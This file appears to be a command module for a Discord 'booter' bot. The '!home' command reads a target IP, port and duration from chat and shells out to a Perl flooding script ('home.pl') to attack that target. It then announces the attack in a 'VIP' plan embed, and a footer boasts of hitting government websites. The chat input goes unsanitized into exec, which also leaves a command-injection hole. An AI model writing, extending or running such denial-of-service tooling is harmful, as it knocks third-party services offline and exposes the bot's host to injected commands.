const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const duration = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`VD, !home 1.1.1.1 80 60`")
	.setFooter(" 𝑲𝒉𝒐𝒏𝒈 𝑻𝒂𝒏 𝑪𝒐𝒏𝒈 𝑪𝒂𝒄 𝑾𝒆𝒃 .𝒈𝒐𝒗 𝑫𝒖𝒐𝒊 𝑴𝒐𝒊 𝑯𝒊𝒏𝒉 𝒕𝒉𝒖𝒄!")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`perl home.pl ${host} ${port} 65500 ${duration}`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 ** 𝑯𝒂𝒏𝒌𝒔** 🚀')
	.setTimestamp()
  .setDescription("**𝓟𝓵𝓪𝓷**: `VIP 👨` \n **𝓣𝓪𝓻𝓰𝓮𝓽** : `" + host + "` \n **𝓟𝓸𝓻𝓽** : `" + port + "` \n **𝓜𝓮𝓽𝓱𝓸𝓭** : `HOME 💣` \n **𝓣𝓲𝓶𝓮** : `" + duration + "`")
	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://cdn.discordapp.com/attachments/965999769585602620/980224505077190656/D39411DD-6E97-4769-AF1D-D287768752D9.mov"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://media.giphy.com/media/6036p0cTnjUrNFpAlr/giphy.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 ** 𝑯𝒂𝒏𝒌𝒔** 🚀')
	.setTimestamp()
	.setDescription("**►𝓓𝓪𝓷𝓰 𝓧𝓪𝓬 𝓜𝓲𝓷𝓱.......**")
	.setFooter('© 𝑯𝒂𝒏𝒌𝒔#4185', client.user.avatarURL)
	.setTimestamp()
	.setImage(loadinggif)
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['home'],
  permLevel: 0
}

exports.help = {
  name: 'home',
  description: 'HANKS',
  usage: 'home'
}
